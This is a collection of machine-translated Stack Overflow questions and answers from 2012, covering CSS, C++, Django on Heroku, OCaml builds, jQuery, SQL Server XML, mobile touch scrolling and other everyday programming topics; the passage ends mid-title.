# html - 修复 IE 中的下拉对齐

> ID：11866318
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:09:21.250
> 
> 标签：html, css, internet-explorer, drop-down-menu

我目前正在处理一些客户工作，我使用了我构建的一个简单的下拉菜单。它似乎在大多数浏览器中都能正常工作，除了 IE。调试一直很痛苦，因为 IE 并没有真正提供太多的洞察力，而且我无法确定确切的问题。

下拉列表是一个`position: absolute`包含三个`<ul>`' 的 div。据我所知，div 的位置没问题，但第一个 ul 的宽度是其应有的宽度的两倍，没有明确的原因，因此看起来整个下拉列表没有正确对齐。

下拉列表可以在这里找到：[fatumdemo.platonlearning.com](http://fatumdemo.platonlearning.com)。移动顶部菜单（蓝色）中的菜单项，您可以看到问题。

代码很长，所有人都在这里发布，但如果需要有关结构和 CSS 的更多信息，我很乐意发布它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:25:34.480

乔伊，

1）#navigation ul li --->添加位置：相对属性

2) #navigation ul li .dropdown -----> 把 width:450px 改为 500px

3) #navigation ul li .dropdown ul -----> 放置 width:160px 或更高的值。

主要问题原因是宽度和相对，当您添加绝对位置时，相对是父元素的必须，宽度和高度必须是绝对元素

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T13:05:48.703

问题在于我使用`li`'s 以外的元素作为 a 的子元素`ul`。与所有其他浏览器不同，Internet Explorer 显然不能容忍这种行为，并将其他元素视为列表项，因此我的下拉列表被放入 IE 中的错误列表项中。

# overloading - 为什么函数覆盖隐藏了基类中重载的函数

> ID：11866320
> 
> 赞同：2
> 
> 时间：2012-08-08T14:09:21.447
> 
> 标签：overloading

请给我一个具体的答案，为什么函数覆盖会隐藏基类中重载的函数。

```
class Base{
public:
  fun(int,int);
  fun(B);
};
class Derived:public Base
{
public:
fun();
};

int main()
{
Derived d;
d.fun(1,2); // error
return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:30:53.147

TTBOMK 这没有真正的技术原因，只是 Stroustrup 在创建语言时认为这是更好的默认设置。（这类似于右值不隐式绑定到非常量引用的规则。）

您可以轻松地解决它，将基类版本显式引入派生类的范围：

```
class Base {
public:
  void fun(int,int);
  void fun(Base);
};

class Derived : public Base {
public:
  using Base::fun;
  void fun();
}; 
```

另请参阅 WHY 链接，因为它说明了为什么基重载方法隐藏在派生类中：[WHY](https://stackoverflow.com/questions/1628768/why-does-an-overridden-function-in-the-derived-class-hide-other-overloads-of-the)

# python - Django 项目的 Heroku 日志丢失错误

> ID：11866322
> 
> 赞同：14
> 
> 时间：2012-08-08T14:09:23.347
> 
> 标签：python, django, logging, heroku

我正在 Heroku 上运行一个简单的 Django 项目。它可以工作，但如果我收到服务器错误，它不会在日志中给我任何详细信息。这使得错误难以处理。

现在我已经设置了一个登台服务器，它也有同样的问题——页面失败了，我没有得到任何关于原因的反馈。

$ heroku 日志

...

```
2012-08-08T13:55:58+00:00 app[web.1]: Development server is running at http://0.0.0.0:59048/
2012-08-08T13:55:59+00:00 heroku[web.1]: State changed from starting to up
2012-08-08T13:56:01+00:00 heroku[router]: GET [xxx].herokuapp.com/ dyno=web.1 queue=0 wait=0ms service=22ms status=500 bytes=27
2012-08-08T13:56:01+00:00 app[web.1]: [08/Aug/2012 14:56:01] "GET / HTTP/1.1" 500 27
2012-08-08T13:56:02+00:00 heroku[router]: GET [xxx].herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=6ms status=500 bytes=27
2012-08-08T13:56:09+00:00 heroku[router]: GET[xxx].herokuapp.com/admin dyno=web.1 queue=0 wait=0ms service=2ms status=301 bytes=0
2012-08-08T13:56:09+00:00 app[web.1]: [08/Aug/2012 14:56:09] "GET /admin HTTP/1.1" 301 0
2012-08-08T13:56:10+00:00 heroku[router]: GET [xxx].herokuapp.com/admin/ dyno=web.1 queue=0 wait=0ms service=224ms status=500 bytes=27
2012-08-08T13:56:10+00:00 app[web.1]: [08/Aug/2012 14:56:10] "GET /admin/ HTTP/1.1" 500 27
2012-08-08T13:56:10+00:00 heroku[router]: GET [xxx].herokuapp.com/favicon.ico dyno=web.1 queue=0 wait=0ms service=6ms status=500 bytes=27 
```

如您所见，页面返回 500，但我没有收到任何堆栈跟踪信息或类似信息。

可能的问题可以通过以下方式指示：'开发服务器正在运行...' - 这是什么意思，它是否影响错误记录？

此外，我正在使用“500.html”模板文件来定义自定义 500 错误页面。这会以某种方式隐藏错误吗？真的不应该。

还是我需要在另一个地方寻找 Heroku 上的 Django 日志？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-09T08:33:34.347

看起来这只是由于期望 Heroku 下的 Django 会像 Rails 一样工作而导致的问题。傻我。

对于从一种框架/语言迁移到另一种框架/语言时遇到此问题的其他人：

*   当调试关闭时，Django 使用标准 Python 记录器来处理代码中的错误。
*   在 settings.py 的底部有一个默认设置，当出现错误时会通过电子邮件发送给站点管理员。好的。它需要 settings.py 中 ADMINS 变量中的一组电子邮件地址才能工作。
*   默认情况下，错误会发送到 STDERR 而不是 STDOUT，因此它们不会显示在日志中。这显然可以改变。如果您想要这种行为，请在此处尝试：

    [http://codeinthehole.com/writing/console-logging-to-stdout-in-django/](http://codeinthehole.com/writing/console-logging-to-stdout-in-django/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:23:59.863

此行为由服务器（例如 gunicorn）设置，而不是 Django 或 Heroku。

通常有一个命令行或配置可以更改默认日志级别。

* * *

## 回答 #3

> 赞同：-6
> 
> 时间：2017-01-05T18:55:39.480

这可以通过更改 settings.py 文件中的 DEBUG 来解决。调试=真

# ocaml - 使用 ocamlbuild 将选项传递给 camlp4

> ID：11866324
> 
> 赞同：3
> 
> 时间：2012-08-08T14:09:29.263
> 
> 标签：ocaml, ocamlbuild, camlp4, ocamlfind

我正在使用 ocamlbuild 对 ocamlfind 的原生支持来简化我的项目的构建过程。File`foo.ml`依赖于使用camlp4 的宏进行条件编译。该`_tags`文件包含以下内容：

```
<foo.ml>: package(camlp4.macro), syntax(camlp4o) 
```

这很好用，但我无法将选项传递给camlp4。如果不使用 ocamlbuild+ocamlfind 自动化，命令行将是这样的：

```
camlp4o pa_macro.cmo -DFOO file.ml 
```

`-DFOO`但是在使用 ocamlbuild+ocamlfind 时如何传递 camlp4变量？我觉得应该有一个简单的命令行选项，而不是乱用`myocamlbuild.ml`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T15:36:41.120

你会搞砸的`myocamlbuild.ml`。插入 -ppopt 没有内置规则，因此它相当冗长，但很简单。

`myocamlbuild.ml`：

```
open Ocamlbuild_plugin ;;
dispatch begin function
| After_rules ->
pflag ["ocaml";"compile";] "define" (fun s -> S [A"-ppopt"; A ("-D"^s)]);
pflag ["ocaml";"ocamldep";] "define" (fun s -> S [A"-ppopt"; A ("-D"^s)])
| _ -> ()
end;; 
```

在`_tags`：

```
"foo.ml": syntax(camlp4o), package(camlp4.macro), define(FOO) 
```

# jquery - 防止跨元素多次单击（JQuery）

> ID：11866325
> 
> 赞同：2
> 
> 时间：2012-08-08T14:09:28.840
> 
> 标签：jquery

我有一组锚点，我将一个事件绑定到每个锚点：

```
$j('.opts a').live("click", function(e){}) ; 
```

我想阻止其他锚点可点击，直到此点击事件完成。

```
$j('.opts a').live("click", function(e){
  $j('.opts a').unbind('click'); 
  //do something
  $j('.opts a').bind('click');
}); 
```

这只是我尝试过的一件事的一个例子，但即使解除绑定也不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:13:12.553

您无法真正阻止链接被点击。您只能取消绑定您注册的任何 JS 事件。您需要确保调用`preventDefault()`，否则链接将跟随其`href`.

尝试这样的事情。

```
var isDoingSomething = false;
$j('.opts a').on('click', function (e) {
    e.preventDefault();
    if (!isDoingSomething) {
        isDoingSomething = true;
        // do something
        isDoingSomething = false;
    }
}); 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:20:23.110

我不认为 jQuery 是正确的工具。您的问题是，当您的 JavaScript 执行某些操作时，事件会排队。

所以你真正需要的是“当我返回时吞下所有排队的点击事件”。

我建议将点击处理程序的重新绑定移动到一个新函数中并在计时器中调用它。这允许浏览器处理排队的事件。

也许解除约束也是错误的方法。如果您总是使用相同的处理程序，请将其转换为具有`skip`属性的对象：

```
skip: false,
run: function( e ) {
    if (this.skip) return;

    this.skip = true;

    ... do something ...

    var self = this;
    setTimeout( function() { self.skip = false; }, 50 );
} 
```

**[编辑]**另一种选择：如果所有链接都在一个 HTML 元素中（如父元素`div`或其他元素），您可以为该元素安装一个单击处理程序，它什么都不做。这也会吞噬点击事件。您仍然需要超时处理程序来确保在您从函数返回后处理事件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:13:14.390

**坏**->

```
$j('.opts a').live("click", function(e){
  $j('.opts a').unbind('click'); 
  //do something
  $j('.opts a').bind('click');
}); 
```

**好**->

```
$j(document).on("click", '.opts a', function(e){
  $j('.opts a').off('click'); 
  //do something
  $j('.opts a').on('click', //a function such as 'myClickFunction' referencing what you want to occur.);
}); 
```

# sql-server - 名称值对的 SQL XML 查询？

> ID：11866332
> 
> 赞同：0
> 
> 时间：2012-08-08T14:09:48.043
> 
> 标签：sql-server, xml

首先，我首先要指出的是，在 XML 中使用 nvp 并不是我的选择，而且它正在修改过程中。话虽如此，我有一个表，其中包含一个 XML 列，该列具有以下 xml：

```
<root>
  <results>
    <result name='First Result'>
      <property name='Property1' value='Value1' />
      <property name='Property2' value='Value2' />
    </result>
  </results>
</root> 
```

我有以下查询可以让我得到结果名称：

```
SELECT
  T.N.value('@name', 'nvarchar(256)') AS resultName
FROM
  results CROSS APPLY xmlField.nodes('/root/results/result') AS T(N) 
```

但我不肯定如何让房产展示。我尝试了以下方法：

```
SELECT
  T.N.value('@name', 'nvarchar(256)') AS resultName,
  T.N.value('/property[@name="Property1"]/@value', 'nvarchar(256)') AS Property
FROM
  results CROSS APPLY xmlField.nodes('/root/results/result') AS T(N) 
```

但我收到以下错误：

XQuery [results .xmlField.value()]: 'value()' 需要一个单例（或空序列），找到类型为 'xdt:untypedAtomic *' 的操作数

我知道我走在正确的道路上，但我不太确定我应该做什么。有人能指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:14:28.823

这就是你所追求的吗？

```
SELECT 
  T.N.value('../@name','varchar(255)') as resultName,
  T.N.value('@name', 'nvarchar(256)') AS Propertyname ,
  T.N.value('@value', 'nvarchar(256)') as Value      
FROM 
    results
        cross apply
  xmlfield.nodes('/root/results/result/property') AS T(N) 
where
     T.N.value('@name', 'nvarchar(256)') ='property1' 
```

或者

```
SELECT 
  T.N.value('@name', 'nvarchar(256)') AS resultName,
  T.N.value('(./property[@name="Property1"]/@value)[1]', 'nvarchar(256)') AS Property 
FROM 
  results CROSS APPLY xmlField.nodes('/root/results/result') AS T(N) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:16:07.273

尝试在 xpath 中查找第一个匹配节点。

```
SELECT   organizationDeviceId,   
         T.N.value('@name', 'nvarchar(256)') AS resultName,   
         T.N.value('(/property[@name="Property1"])[1]/@value', 'nvarchar(256)') AS Property
       FROM results CROSS APPLY xmlField.nodes('/root/results/result') AS T(N) 
```

我不是 100% 确定结果，但需要用于`[1]`查找第一个结果。

# python - 尝试提供文件时出现 IOerror

> ID：11866333
> 
> 赞同：1
> 
> 时间：2012-08-08T14:09:53.380
> 
> 标签：python, apache, mod-wsgi, web.py

我正在尝试使用 web.py 框架将处理后的数据文件返回给 webapp 用户。在本例中，该文件名为 plate3_v4.gb。我正在尝试使用名称 results.gb 返回它。这是基于[这个线程](https://groups.google.com/forum/?fromgroups#!topic/webpy/zep8cMeQtgk%5B1-25%5D)。

这是代码：

```
class ServeHandler():
    def GET(self):
        web.header("Content-Disposition", "attachment; filename=%s" %"results.gb")
        web.header("Content-Type", "gb")
        web.header('Transfer-Encoding','chunked')
        f = open('/usr/local/www/wsgi-scripts/uploads/plate3_v4.gb','rb')
        while 1:
            buf = f.read(1024 * 8)
            if not buf:
                break
            yield buf 
```

当我转到我认为应该向我提供数据的页面时，我得到

```
mod_wsgi (pid=21773): Exception occurred processing WSGI script '/usr/local/www/wsgi-scripts/code.py'.
IOError: failed to write data 
```

在我的错误日志中。

有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-09T01:54:20.107

首先，WSGI 应用程序不应该自己设置 Transfer-Encoding 响应头。只有底层的 Web 服务器应该这样做。对于 mod_wsgi，只要没有提供响应内容长度，Apache 就应该自动执行此操作。

至于错误，它表明客户端在读取所有返回的数据之前关闭了套接字连接。

# android - 不同移动设备屏幕上游戏的纵横比

> ID：11866334
> 
> 赞同：3
> 
> 时间：2012-08-08T14:09:53.753
> 
> 标签：android, ios, html, blackberry, image-resizing

我正在不同平台上制作游戏，我需要保持固定的纵横比，同时根据不同的设备屏幕尺寸重新缩放游戏......

1) 所以有很多不同的屏幕尺寸，因为有很多不同的 android、ios 和 blackberry 设备。是否有所有建议的纵横比，通用纵横比？

2) 否则，这些设备是否具有不同的屏幕分辨率（即 540X480、1024X720 等）？这是否意味着我必须只针对固定数量的移动设备（即 5 个），并在数学上找到每个移动设备的屏幕分辨率的纵横比？

3）有没有更优化的方法来完成上述操作？

非常感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:22:55.897

在处理游戏屏幕尺寸时，您通常希望有一个固定的屏幕比例（取决于游戏的类型），而不是让某些人获得优势而让其他人处于劣势（由于用户在不同设备上玩您的游戏）。

我以 320x470 的比例进行开发（因为这是 Android 移动设备最常见的屏幕比例）。我建议你根据这个比例来开发你的游戏。

在实际渲染帧缓冲区时，要么拉伸它以填充屏幕，要么使用一种称为信箱的技术。两者都有其优点和缺点。

我希望这能给你一个更深入的见解，也许你会知道如何解决你的问题。

# javascript - 移动/触摸屏 - 滑动时水平滚动

> ID：11866345
> 
> 赞同：3
> 
> 时间：2012-08-08T14:10:26.017
> 
> 标签：javascript, twitter-bootstrap, touch, horizontal-scrolling, swipe-gesture

在详细讨论了[这个 SO question之后提出了这个问题](https://stackoverflow.com/q/11649405/226906)

问题：

我需要一个水平滚动条，可以使用桌面上的鼠标拖动和触摸屏上的滑动事件进行滚动

可能的解决方案：

我尝试使用 jQuery dragscrollable，它在桌面上运行良好，但在支持触摸的设备上运行良好

因此，我继续探索[Touch Swipe Jquery Plugin](https://github.com/mattbryson/TouchSwipe-Jquery-Plugin)并在[JSFiddle Code](http://jsfiddle.net/celestialcitizen/BR4Av/)上提出了一个可能的解决方案，JSFiddle的结果可以在[这里找到](http://jsfiddle.net/celestialcitizen/BR4Av/embedded/result/)

您还可以在[此处找到工作演示](http://touchswipedemo.celestialcitizen.jit.su/)

我的java脚本代码如下

```
//to detect if device has touch enabled
var is_touch_device = 'ontouchstart' in document.documentElement;

        $(function() 
        {
                $('.myClass').dragscrollable();
                //if touch is enabled then we have to map the swipe event                         
                if(is_touch_device)
                    $('.panel_list').swipe( { swipeStatus:scroll_panel_list, allowPageScroll:'horizontal' } );
                function scroll_panel_list(event, phase, direction, distance)
                {
                    var pos = $('.myClass').scrollLeft();
                    if(direction == 'left')
                    {
                        $('.myClass').animate({scrollLeft: pos + 200} );
                    }
                    if(direction == 'right')
                    {
                        $('.myClass').animate({scrollLeft: pos - 200} );
                    }
                }    
            });​ 
```

我已经测试过它在 Android 浏览器上运行良好，但在 iPhone 上不是很响应。

有人可以帮我想出一个更好的解决方案吗？我正在使用推特引导程序

编辑：1

好吧，现在我想我可能已经找到了一个不错的插件，它似乎在台式机和支持触摸的设备上运行良好，该插件名为[jquery.dragscroll](https://github.com/iwyg/jquery.dragscroll)，我在[这里有一个更新的演示](http://touchswipedemo.celestialcitizen.jit.su/)

编辑：2

似乎有另一个插件支持触控设备，它被称为[Overscroll](https://github.com/azoff/Overscroll)。我还没有评价它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T01:25:00.417

此外，还有“Swipeview”脚本 [http://cubiq.org/swipeview](http://cubiq.org/swipeview)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-02-29T18:40:33.623

我找到了一个较旧的解决方案并将其修改为水平滚动。我已经在 Android Chrome 和 iOS Safari 上对其进行了测试，并且监听器触摸事件已经存在很长时间了，所以它有很好的支持：[http](http://caniuse.com/#feat=touch) ://caniuse.com/#feat=touch 。

**用法：**

```
touchHorizScroll('divIDtoScroll'); 
```

**功能：**

```
function touchHorizScroll(id){
    if(isTouchDevice()){ //if touch events exist...
        var el=document.getElementById(id);
        var scrollStartPos=0;

        document.getElementById(id).addEventListener("touchstart", function(event) {
            scrollStartPos=this.scrollLeft+event.touches[0].pageX;              
        },false);

        document.getElementById(id).addEventListener("touchmove", function(event) {
            this.scrollLeft=scrollStartPos-event.touches[0].pageX;              
        },false);
    }
}
function isTouchDevice(){
    try{
        document.createEvent("TouchEvent");
        return true;
    }catch(e){
        return false;
    }
} 
```

独创垂直单指触控滚动：

[http://chris-barr.com/2010/05/scrolling_a_overflowauto_element_on_a_touch_screen_device/](http://chris-barr.com/2010/05/scrolling_a_overflowauto_element_on_a_touch_screen_device/)

Vertical 现在有一个简化的 CSS 解决方案，但不适用于移动设备上的水平 DIV 滚动：

```
-webkit-overflow-scrolling: touch 
```

该问题还要求**在桌面上进行鼠标抓取**，这可以通过 Nice Scroll 完成，并且如果您需要它，它可以与我上面的解决方案协同工作：

[https://github.com/inuyaksa/jquery.nicescroll](https://github.com/inuyaksa/jquery.nicescroll)

```
var nice = $("#mydiv").getNiceScroll({horizrailenabled: true, hwacceleration: true}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-09T14:36:24.947

这是可能的

[http://labs.rampinteractive.co.uk/touchSwipe/demos/Page_scrolling.html](http://labs.rampinteractive.co.uk/touchSwipe/demos/Page_scrolling.html)

```
$('body').swipe({
        swipe: function(event, direction, distance, duration, fingerCount) {
            switch (direction) {
                case 'left':
                    // Code here
                    break;
                case 'right':
                   //Code here
                   break;
            }
        },
        allowPageScroll: "vertical"
    }); 
```

# objective-c - 从 NSKeyedArchiver 中提取 NSString

> ID：11866355
> 
> 赞同：0
> 
> 时间：2012-08-08T14:10:50.197
> 
> 标签：objective-c

我正在尝试从 NSKeyedArchiver 中提取 NSString，如下所示：

```
NSMutableData *data = [[NSMutableData alloc] init];
NSKeyedArchiver *coder = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
[coder encodeInt:1 forKey:@"myField"];
[coder finishEncoding];

NSString *myString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
NSLog(@"%@", myString); 
```

问题是 myString 为零（NSLog 打印 '(null)'）。上面的代码有什么问题？

我读过的其他帖子提到这通常是由于编码错误（即 NSMutableData 使用与 UTF-8 不同的编码）。我已经尝试了所有不同类型的编码，但仍然没有运气。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-08T14:30:51.683

我看不到您在哪里编码字符串。通常你会用 编码`NSString`，`NSKeyedArchiver`然后用`NSKeyedUnarchiver`. 看起来您并不了解这一切是如何运作的。我建议阅读有关[使用 Obj-C 进行归档的](http://cocoadevcentral.com/articles/000084.php)信息。

# c# - 在其他机器上运行 XNA 4.0 游戏

> ID：11866356
> 
> 赞同：0
> 
> 时间：2012-08-08T14:10:50.693
> 
> 标签：c#, xna-4.0

我在这里查看：[如何让 XNA 4.0 游戏在其他机器上运行？](https://stackoverflow.com/questions/4434191/how-do-i-get-an-xna-4-0-game-to-run-on-other-machines)，但其中没有真正的解决方案。

我创建了一个完全空的 XNA4.0 项目，选择了 Release 并编译它，rar'd 发布文件夹并将其发送到非开发 PC。收到 Appcrash 通用错误。

它可能是我做错的标准，但不知道是什么.. 可以确认.NET4.0、XNA Redist 4.0 和 DirectX 都安装在另一台机器上。

更新：现在加载空的“新游戏”，但我在过去几年里制作了一个或六个程序，每个程序都不能在另一台机器上运行。有人可以将我链接到“适当的”引用、程序集等吗？结合我的问题，谷歌不止一次放弃了这些词。

更新：我让一个朋友在他的电脑上测试，起初，同样的错误，但他忘记安装 XNA 4.0 redist。之后，我的文件在他的电脑上运行良好。尽管如此，出于某种原因，他们并没有在我自己的非开发机器上工作。无论如何，感谢您的建议，既然我知道它的本地，我可能可以自己修复它。仍然欢迎提出建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:16:30.023

最终用户需要安装 .NET 4.0、[XNA 4.0 Redistributable](http://www.microsoft.com/en-us/download/details.aspx?id=20914)（不是完整的游戏工作室）和 DirectX。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:14:29.120

是否安装了 Dot-Net 4.0 和 XNA 4.0 框架？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T23:40:58.447

选择发布项目，您将获得一个安装程序，为您检查并安装所需的库...

# css - 跨浏览器兼容性的导航填充不同

> ID：11866358
> 
> 赞同：0
> 
> 时间：2012-08-08T14:10:53.817
> 
> 标签：css, cross-browser, navigation, padding

[http://danhumphrey.co.uk/nav/main.html](http://danhumphrey.co.uk/nav/main.html)

如果你在 Chrome 和 Firefox 或 IE 中打开它，你会注意到我在让 lis 与导航栏正确对齐时遇到了一些麻烦。

我在 li 的左侧和右侧添加了填充，然后尝试将自定义填充添加到单个 li。关于我哪里出错的任何提示？

谢谢，丹

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:34:06.587

1）从您的导航元素中删除背景，

2) 添加

```
nav ul li {
...
background: #474747
} 
```

3）添加这个以使您的 lis 与 nav 元素对齐

```
#brands {
margin-left: 20px;
} 
```

4）如果您想将导航高度调整为lis高度，请将导航高度增加到30px，因为您的lis有28px高度和2x1px边框，总和变为30px

# java - 使用 DSMovie 的 Swing 媒体播放器

> ID：11866359
> 
> 赞同：0
> 
> 时间：2012-08-08T14:10:58.773
> 
> 标签：java, swing

我使用`DSMovie`类在我的`Swing`应用程序中播放媒体播放器文件。我需要帮助来改变音量。

```
//play movie
DSMovie movie = new DSMovie(filename,DSFiltergraph.RENDER_NATIVE,this);

//stop movie
movie.stop(); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:07:41.757

我从未使用过 DSMovie，但经过大约 1 分钟的互联网研究后，我发现了这一点：

[setMasterVolume（浮点数）](http://www.humatic.de/htools/dsj/javadoc/de/humatic/dsj/DSMovie.html#setMasterVolume%28float%29)

所以请在开始使用之前阅读 API 文档

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T22:38:15.380

好的，我找到了方法：

```
DSMovie movie = new DSMovie(filename,DSFiltergraph.RENDER_NATIVE,this); 
movie.setVolume(1);

//to raise the volume
movie.setVolume(movie.getVolume()+0.02);

//to lower the volume
movie.setVolume(movie.getVolume()-0.02); 
```

谢谢。

# html - Jade - 控制 HTML 输出中的换行符

> ID：11866363
> 
> 赞同：8
> 
> 时间：2012-08-08T14:11:15.577
> 
> 标签：html, whitespace, line-breaks, pug, templating

我有一个希望使用 Jade 实现的简单搜索表单。

```
form
    input(
        type="text"
        size="16"
        placeholder="Enter your keywords")
    input(
        type="button"
        value="Search") 
```

输出呈现为：

```
<form>
      <input type="text" size="16" placeholder="Enter your keywords">
      <input type="button" value="Search">
</form> 
```

这是完美的，除了换行符导致我的按钮和搜索按钮之间有一个空格。我不需要文本框和按钮之间的空间。我需要这样的代码呈现：

```
<form>
      <input type="text" size="16" placeholder="Enter your keywords"><input type="button" value="Search">
</form> 
```

但是，我正在使用这个项目来创建需要以 HTML 形式阅读的代码，并且不能简单地从我的项目中删除空白。

有没有一种方法可以输出我的表格，同时在我的文档的其余部分保留白色间距和换行符？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-23T15:27:49.360

我正在寻找同样的东西并遇到了这个：[http ://scalate.fusesource.org/documentation/jade-syntax.html](http://scalate.fusesource.org/documentation/jade-syntax.html)

在纯文本下：空格删除：> 和 <

我在 <a> 标签中遇到了空格问题：

```
a.external(href={"http://foo.bar/" + reference.dxLink.get})
  |CrossRef 
```

导致

```
<a href="http://foo.bar/10.1002/rmv.439">
                  CrossRef
</a> 
```

将 < 添加到行尾：

```
a.external(href={"http://foo.bar/" + reference.dxLink.get})<
  |CrossRef 
```

导致

```
<a href="http://foo.bar/10.1002/rmv.439">CrossRef</a> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T04:55:13.537

如果这是 Node JS 的 Jade，您可以[使用 'pretty' 参数强制jade 删除或添加空格](https://github.com/visionmedia/jade/blob/master/examples/whitespace.js)

```
var jade = require('./../')
  , path = __dirname + '/whitespace.jade'
  , str = require('fs').readFileSync(path, 'utf8')
  , fn = jade.compile(str, { filename: path, pretty: true }); 
```

您可以将表单模板放在一个单独的文件中（例如：myform.jade），并在加载时为该模板设置 pretty 为 false，或者为同样的目的创建一个帮助程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-25T10:18:10.320

我也有这个问题。`locals.pretty`在开发中设置为true，因为我想阅读呈现的html。两个输入之间的空间会导致样式问题。

我目前的解决方案是对这两个输入使用原始 html：

```
form
  <input type="text" size="16" placeholder="Enter your keywords"><input type="button" value="Search"> 
```

这混合了一些非玉文本，但呈现输入时没有额外的空间。

# javascript - Google Fusion Table Javascript 更新查询？

> ID：11866366
> 
> 赞同：0
> 
> 时间：2012-08-08T14:11:27.467
> 
> 标签：javascript, sql-update, google-fusion-tables

我到处寻找使用来自 javascript 的 UPDATE 查询来更新 Google Fusion 表的方法。在读取和处理融合表信息之后，我需要做的就是使用从代码本身生成的数组更新一列。我不需要用户更新表格。

有没有办法单独使用 Javascript 来做到这一点？还是我真的需要 OAuth 2.0 和 php 的组合？有一个可行的例子吗？我发现的只是非常模糊或零碎的。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T23:07:32.000

是的，您需要 OAuth 2.0 和某种服务器端代码（如 PHP）。如果您不需要用户更新表，我猜您正在使用 Fusion Tables 作为应用程序的某种中央数据库。

为此目的（即不涉及用户），Google 提供了所谓的[服务帐户](https://developers.google.com/accounts/docs/OAuth2ServiceAccount)。如果您使用这样的服务帐户，您只需将访问您的表的权限授予此帐户，然后您就可以通过服务器端代码更新表。Google的[PHP OAuth 库](https://code.google.com/p/google-api-php-client/wiki/OAuth2#Service_Accounts)支持服务帐户并且非常易于使用。

如果您想使用尽可能多的 JavaScript 代码，您可以为您的 JavaScript 代码提供 PHP OAuth 库的接口（有关详细信息，请参阅[我对类似问题的回答）。](https://stackoverflow.com/a/11619373/549755)否则，只需将`UPDATE`语句推迟到 PHP 代码就可以了。

# sql-server-2008-r2 - AnsiString 被截断有足够的空间

> ID：11866369
> 
> 赞同：1
> 
> 时间：2012-08-08T14:11:40.727
> 
> 标签：sql-server-2008-r2, unicode-string, c++builder-6

我正在插入一个`JOBCODE`字段定义为的行`varchar(50)`。当该字段的字符串大于 20 个字符时，我从 SQL Server 收到一个错误，警告该字符串将被截断。

我怀疑这可能与 Unicode 宽字符有关，但我认为 25 个字符会通过。

有没有人见过这样的东西？我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:23:34.193

我认为这里还有其他问题。

`VARCHAR(50)`应为 50 个字符，与编码无关

举个例子

```
CREATE TABLE AnsiString
(
    JobCode VARCHAR(20), -- ANSI with codepage
    JobCodeUnicode NVARCHAR(20) -- Unicode
) 
```

在两列中插入 20 个 unicode 字符

```
INSERT INTO AnsiString(JobCode, JobCodeUnicode) VALUES ('葉2葉4葉6葉8葉0葉2葉4葉6葉8叶0', 
                                                        N'葉2葉4葉6葉8葉0葉2葉4葉6葉8叶0')

select * from ansistring 
```

退货

```
?2?4?6?8?0?2?4?6?8?0    葉2葉4葉6葉8葉0葉2葉4葉6葉8叶0 
```

正如所料，? 为未映射到 ANSI 的字符插入，但无论哪种方式，我们仍然可以插入 20 个字符。

你可能有一个触发器在桌子上？它可能完全是另一列吗？您的数据访问层能否以某种方式将您的 unicode 字符串扩展为其他内容（例如 byte[]）？

# ios - 如何将自定义缩放应用到 UIImagePicker 相机？

> ID：11866370
> 
> 赞同：2
> 
> 时间：2012-08-08T14:11:40.640
> 
> 标签：ios, camera, zooming, uiimagepickercontroller

我有一个自定义相机控件，它有滑块来应用缩放。我可以使用以下代码缩放图像：

```
self.pickerReference.cameraViewTransform = CGAffineTransformScale(CGAffineTransformIdentity, zoom, zoom); 
```

但是当我得到图像时，`didFinishPickingMediaWithInfo`我得到的是原始图像`UIImagePickerControllerOriginalImage`，而不是放大的图像。因为`UIImagePickerControllerEditedImage`没有图像。

我也试过：

```
currentImage = [info objectForKey:@"UIImagePickerControllerOriginalImage"];
UIImageView *v = [[UIImageView alloc]initWithImage:currentImage];
UIGraphicsBeginImageContext(v.bounds.size);
CGContextRef context = UIGraphicsGetCurrentContext();
CGContextSaveGState(context);
CGContextScaleCTM(context, zoom, zoom);
[v drawRect:pickerReference.view.bounds];
CGContextRestoreGState(context);
zoomedCurImg = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();
// Write image to PNG file
[UIImageJPEGRepresentation(zoomedCurImg, 0.4) writeToFile:imgPath atomically:YES]; 
```

这确实将缩放应用于原始图像，但缩放始终应用在左上角而不是应用到要应用的位置。

请提出解决方案。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-22T21:29:34.827

我在使用另一段代码时遇到了类似的问题，关闭自动布局为我解决了这个问题。不确定这是否适用于此，但值得一试。

# ruby - OSX Mountain Lion 上的默认 Ruby 版本？还是 1.8.x 或 1.9.x？

